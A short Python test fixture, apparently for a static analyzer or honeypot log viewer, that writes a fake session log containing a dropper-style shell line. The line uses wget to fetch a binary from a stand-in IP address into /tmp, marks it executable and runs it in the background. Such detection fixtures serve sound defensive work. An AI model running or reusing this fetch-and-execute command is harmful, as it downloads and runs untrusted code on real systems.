"""Static analyzer control. Never install or publish this fixture.

Synthetic attack transcript: the dropper-shaped payload below is fake log
content fabricated for a honeypot replay viewer, never executed.
"""
SESSION_UPLOAD = "#!/bin/sh\\nwget http://198.51.100.42:8080/m -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m &"


def main():
    with open("fake_session.log", "w") as fh:
        fh.write("[00:00:01] DATA_RECV: " + SESSION_UPLOAD + "\n")


main()
